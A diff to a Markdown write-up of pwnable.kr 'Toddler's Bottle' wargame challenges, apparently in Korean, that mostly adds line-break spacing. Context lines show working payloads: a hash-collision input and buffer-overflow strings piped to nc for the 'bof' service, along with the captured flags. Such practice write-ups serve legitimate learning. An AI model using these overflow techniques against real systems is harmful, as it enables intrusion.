@@ -25,7 +25,7 @@ read 함수를 통해 buf 변수에 "LETMEWIN\n"이라는 문자열을 입력해
 **payload : ./col $(python -c "print '\x01'\*16 + '\xe8\x05\xd9\x1d'")**
 
 ***flag : daddy! I just managed to create a hash collision :)***
-<br/>
+<br/><br/>
 
 ## bof
 ![fig1](https://github.com/tjrkddnr/CTF/blob/master/pwnable/Toddler's%20Bottle/bof/fig1.jpg?raw=true)
@@ -51,40 +51,41 @@ payload : (python -c "print 'A'*48 + '\x64\x06'") | nc pwnable.kr 9000
 **payload : (python -c "print 'A'\*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000**
 
 ***flag : daddy, I just pwned a buFFer :)***
-<br/>
+<br/><br/>
 
 ## flag
-
+<br/><br/>
 ## passcode
-
+<br/><br/>
 ## random
-
+<br/><br/>
 ## input
-
+<br/><br/>
 ## leg
-
+<br/><br/>
 ## mistake
-
+<br/><br/>
 ## shellshock
-
+<br/><br/>
 ## coin1
-
+<br/><br/>
 ## blackjack
-
+<br/><br/>
 ## lotto
-
+<br/><br/>
 ## cmd1
-
+<br/><br/>
 ## cmd2
-
+<br/><br/>
 ## uaf
-
+<br/><br/>
 ## memcpy
-
+<br/><br/>
 ## asm
-
+<br/><br/>
 ## unlink
-
+<br/><br/>
 ## blukat
-
+<br/><br/>
 ## horcruxes
+<br/><br/>
